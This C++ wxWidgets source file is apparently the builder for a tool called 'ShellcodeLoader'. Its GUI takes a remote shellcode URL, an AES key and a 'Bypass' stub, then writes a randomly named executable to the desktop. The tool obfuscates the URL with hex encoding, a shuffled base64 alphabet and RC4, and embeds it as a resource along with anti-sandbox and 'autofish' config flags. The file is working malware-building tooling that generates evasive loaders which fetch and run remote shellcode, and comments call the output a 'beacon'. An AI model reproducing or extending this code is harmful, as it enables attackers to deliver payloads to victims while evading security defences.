
#include "wx/wxprec.h"
#ifdef __BORLANDC__
#pragma hdrstop
#endif

// for all others, include the necessary headers (this file is usually all you
// need because it includes almost all "standard" wxWidgets headers)
#ifndef WX_PRECOMP
#endif

// ----------------------------------------------------------------------------
// resources
// ----------------------------------------------------------------------------

// the application icon (under Windows it is in resources and even
// though we could still include the XPM here it would be unused)
#ifndef wxHAS_IMAGES_IN_RESOURCES
#include "../sample.xpm"
#endif
#include <wx/wx.h>
#include <wx/filedlg.h>
#include <wx/dir.h>
#include <wx/wfstream.h>
#include <wx/msgdlg.h>
#include <string>
#include <sstream>
#include <windows.h>
#include <filesystem>
#include <shlobj.h>
#include <shlwapi.h>
#include <random>
#include <thread>
#include <chrono>
#include <future>
#include <functional>
#include <fstream>
namespace fs = std::filesystem;


class CshellcodeLoaderDlg : public wxDialog
{
public:
	CshellcodeLoaderDlg(wxWindow* parent = nullptr);

private:
	void OnGenerate(wxCommandEvent& event);
	void OnDropFiles(wxDropFilesEvent& event);
	void OnClose(wxCloseEvent& event);
	void StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength);
	std::string hex_encode(const std::vector<unsigned char>& input);
	std::string base64Encode(const std::string& input);

	wxTextCtrl* ShellcodePath;
	wxTextCtrl* AESKey;
	wxChoice* Method;
	wxIcon m_hIcon;

	wxDECLARE_EVENT_TABLE();
};


enum
{
	ID_Generate = 1,
};


wxBEGIN_EVENT_TABLE(CshellcodeLoaderDlg, wxDialog)
EVT_BUTTON(wxID_ANY, CshellcodeLoaderDlg::OnGenerate)
EVT_DROP_FILES(CshellcodeLoaderDlg::OnDropFiles)
EVT_CLOSE(CshellcodeLoaderDlg::OnClose)
wxEND_EVENT_TABLE()

CshellcodeLoaderDlg::CshellcodeLoaderDlg(wxWindow* parent)
	: wxDialog(parent, wxID_ANY, "ShellcodeLoader", wxDefaultPosition, wxSize(450, 200))
{



	wxPanel* panel = new wxPanel(this, wxID_ANY);
	wxBoxSizer* vbox = new wxBoxSizer(wxVERTICAL);

	wxBoxSizer* hbox1 = new wxBoxSizer(wxHORIZONTAL);
	wxStaticText* urlLabel = new wxStaticText(panel, wxID_ANY, "Shellcode");
	urlLabel->SetForegroundColour(wxColour(255, 255, 255)); 
	ShellcodePath = new wxTextCtrl(panel, wxID_ANY, "", wxDefaultPosition, wxSize(250, 25));
	hbox1->Add(urlLabel, 0, wxRIGHT, 8);
	hbox1->Add(ShellcodePath, 1);
	vbox->Add(hbox1, 0, wxEXPAND | wxLEFT | wxRIGHT | wxTOP, 10);

	wxBoxSizer* hbox2 = new wxBoxSizer(wxHORIZONTAL);
	wxStaticText* keyLabel = new wxStaticText(panel, wxID_ANY, " AESKEY ");
	keyLabel->SetForegroundColour(wxColour(255, 255, 255)); 
    AESKey = new wxTextCtrl(panel, wxID_ANY, "", wxDefaultPosition, wxSize(250, 25));
	hbox2->Add(keyLabel, 0, wxRIGHT, 8);
	hbox2->Add(AESKey, 1);
	vbox->Add(hbox2, 0, wxEXPAND | wxLEFT | wxRIGHT | wxTOP, 10);


	wxBoxSizer* hbox3 = new wxBoxSizer(wxHORIZONTAL);
	wxStaticText* fileLabel = new wxStaticText(panel, wxID_ANY, " Bypass ");
	fileLabel->SetForegroundColour(wxColour(255, 255, 255));
	Method = new wxChoice(panel, wxID_ANY, wxDefaultPosition, wxSize(250, 25));
	hbox3->Add(fileLabel, 0, wxRIGHT, 8);
	hbox3->Add(Method, 1);
	vbox->Add(hbox3, 0, wxEXPAND | wxLEFT | wxRIGHT | wxTOP, 10);

	wxDir dir(wxGetCwd() + "/DATA");
	if (dir.IsOpened())
	{
		wxString filename;
		bool cont = dir.GetFirst(&filename, "*.DAT", wxDIR_FILES);
		while (cont)
		{
			Method->Append(filename);
			cont = dir.GetNext(&filename);
		}
	}

	wxBoxSizer* hbox4 = new wxBoxSizer(wxHORIZONTAL);
	wxButton* generateBtn = new wxButton(panel, wxID_ANY, "Generate", wxDefaultPosition, wxSize(100, 30));
	generateBtn->SetBackgroundColour(wxColour(172, 172, 172));
	generateBtn->SetForegroundColour(wxColour(255, 255, 255));
	hbox4->Add(generateBtn, 0, wxALIGN_CENTER);
	vbox->Add(hbox4, 0, wxALIGN_CENTER | wxALL, 10);

	panel->SetSizer(vbox);

	// 設置字體和背景顏色
	//wxFont font(13, NULL, NULL, NULL);
	//urlLabel->SetFont(font);
	//keyLabel->SetFont(font);

	//fileLabel->SetFont(font);
	//generateBtn->SetFont(font);

	//ShellcodePath->SetFont(font);
	//AESKey->SetFont(font);
	//Method->SetFont(font);

	urlLabel->SetForegroundColour(*wxBLACK);
	keyLabel->SetForegroundColour(*wxBLACK);
	fileLabel->SetForegroundColour(*wxBLACK);
	ShellcodePath->SetForegroundColour(*wxBLACK);
	AESKey->SetForegroundColour(*wxBLACK);
	Method->SetForegroundColour(*wxBLACK);
	generateBtn->SetForegroundColour(*wxBLACK);


	panel->SetBackgroundColour(wxColour(192, 192, 192)); 
	ShellcodePath->SetBackgroundColour(wxColour(255, 255, 255)); 
	AESKey->SetBackgroundColour(wxColour(255, 255, 255)); 
	Method->SetBackgroundColour(wxColour(255, 255, 255)); 

	Layout();
}

class MyApp : public wxApp
{
public:
	virtual bool OnInit();
};

wxIMPLEMENT_APP(MyApp);

bool MyApp::OnInit()
{
	CshellcodeLoaderDlg* frame = new CshellcodeLoaderDlg();
	frame->Show(true);
	return true;
}


void CshellcodeLoaderDlg::StreamCrypt(unsigned char* Data, unsigned long Length, unsigned char* Key, unsigned long KeyLength)
{
	int i = 0, j = 0;
	unsigned char k[256] = { 0 }, s[256] = { 0 };
	unsigned char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i % KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	unsigned long l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}

std::string CshellcodeLoaderDlg::hex_encode(const std::vector<unsigned char>& input)
{
	std::stringstream encoded_stream;
	encoded_stream << std::hex << std::setfill('0');

	for (unsigned char c : input)
	{
		encoded_stream << std::setw(2) << static_cast<unsigned int>(c);
	}

	return encoded_stream.str();
}

std::string CshellcodeLoaderDlg::base64Encode(const std::string& input)
{
	const std::string base64Chars = "i7jLW6S0GX5uf1cv3ny2q4es8Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN";

	std::string output;
	int val = 0;
	int valBits = 0;

	for (const auto& c : input) {
		val = (val << 8) | static_cast<unsigned char>(c);
		valBits += 8;

		while (valBits >= 6) {
			valBits -= 6;
			output += base64Chars[(val >> valBits) & 0x3F];
		}
	}

	if (valBits > 0) {
		val <<= (6 - valBits);
		output += base64Chars[val & 0x3F];

		int padding = (6 - valBits) / 2;
		for (int i = 0; i < padding; ++i) {
			output += '=';
		}
	}

	return output;
}

struct CONFIG
{
	int antisandbox;
	int autofish;
	unsigned char key[128];
} config = {};

void CopyFileToDesktop(const std::wstring& srcPath, const std::wstring& destPath) {
	BOOL result = CopyFileEx(srcPath.c_str(), destPath.c_str(), NULL, NULL, NULL, COPY_FILE_ALLOW_DECRYPTED_DESTINATION);
	if (result == 0) {
		wxMessageBox(_T("Build loader failed"));
		return;
	}
}



void CshellcodeLoaderDlg::OnGenerate(wxCommandEvent& event)
{


    if (ShellcodePath->GetValue().IsEmpty())
    {
        wxMessageBox("Please enter the URL for the shellcode!!!", "Error", wxOK | wxICON_ERROR);
        //wxMessageBox("請填寫Shellcode的網址！！！", "Error", wxOK | wxICON_ERROR);
        return;
    }

    if (AESKey->GetValue().IsEmpty())
    {
        wxMessageBox("Please enter a 16 byte AES Key!!!", "Error", wxOK | wxICON_ERROR);
        //wxMessageBox("請填寫16位元組的AES密鑰！！！", "Error", wxOK | wxICON_ERROR);
        return;
    }

    if (Method->GetStringSelection().IsEmpty())
    {
        wxMessageBox("Please enter the loader method!!!", "Error", wxOK | wxICON_ERROR);
        //wxMessageBox("請填寫載入器方法！！！", "Error", wxOK | wxICON_ERROR);
        return;
    }

    //wxMessageBox1("The beacon will be generated on the DESKTOP!", "Please wait a moment", wxOK);


    srand(time(0));
    for (int i = 0; i < 128; i++)
    {
        config.key[i] = rand() % 0xFF;
    }
    std::string method(Method->GetStringSelection().mb_str());
    std::string srcpath = "DATA\\" + method;
    //srcpath = "DATA\\testIaT_inj.DAT";
    std::wstring srcpath1(srcpath.begin(), srcpath.end());
    wchar_t filepath[MAX_PATH] = { 0 };
    SHGetSpecialFolderPath(0, filepath, CSIDL_DESKTOPDIRECTORY, 0);
    std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string randomString;
    std::srand(std::time(nullptr));
    int length = 6;
    for (int i = 0; i < length; i++)
    {
        int randomIndex = std::rand() % charset.length();
        randomString += charset[randomIndex];
    }
    std::string filename = "\\" + randomString + ".exe";
    std::wstring wideFilename(filename.begin(), filename.end());
    PathAppendW(filepath, wideFilename.c_str());

    CopyFileToDesktop(srcpath1, filepath);


    std::string url(ShellcodePath->GetValue().mb_str());
    std::vector<unsigned char> binaryArray(url.begin(), url.end());
    std::string encoded_string = base64Encode(hex_encode(binaryArray));
    std::string aeskey(AESKey->GetValue().mb_str());
    int shellcodeSize = encoded_string.length();
    PBYTE shellcode = (PBYTE)malloc(shellcodeSize + sizeof(config) + sizeof(aeskey));

    memcpy(shellcode, &config, sizeof(config));
    memcpy(shellcode + sizeof(config), aeskey.c_str(), sizeof(aeskey));
    memcpy(shellcode + sizeof(config) + sizeof(aeskey), encoded_string.c_str(), shellcodeSize);

    StreamCrypt(shellcode + sizeof(CONFIG) + sizeof(aeskey), shellcodeSize, config.key, 128);

    HANDLE  hResource = BeginUpdateResource(filepath, FALSE);
    if (NULL != hResource)
    {
        if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_SYS_DEFAULT), (LPVOID)shellcode, shellcodeSize + sizeof(config) + sizeof(aeskey)) != FALSE)
        {
            //wxMessageBox("載入器已成功生成在桌面上！！！", "SUCCESS", wxOK);
            wxMessageBox("The loader has been successfully generated on the desktop!!!", "SUCCESS", wxOK);
            EndUpdateResource(hResource, FALSE);
        }
    }
    free(shellcode);

    return;
}

void CshellcodeLoaderDlg::OnDropFiles(wxDropFilesEvent& event)
{
    if (event.GetNumberOfFiles() > 0)
    {
        wxString* dropped = event.GetFiles();
        ShellcodePath->SetValue(dropped[0]);
    }
}

struct ThreadParams {};

void CshellcodeLoaderDlg::OnClose(wxCloseEvent& event)
{
    
    Hide();
    //wxMessageBox("hoshino會定期進行版本更新，請持續關注哦！！！", "提示", wxOK | wxICON_INFORMATION);
    wxMessageBox("hoshino will regularly update versions; please stay tuned!!!", "提示", wxOK | wxICON_INFORMATION);
    wxExit();
    event.Veto();


}

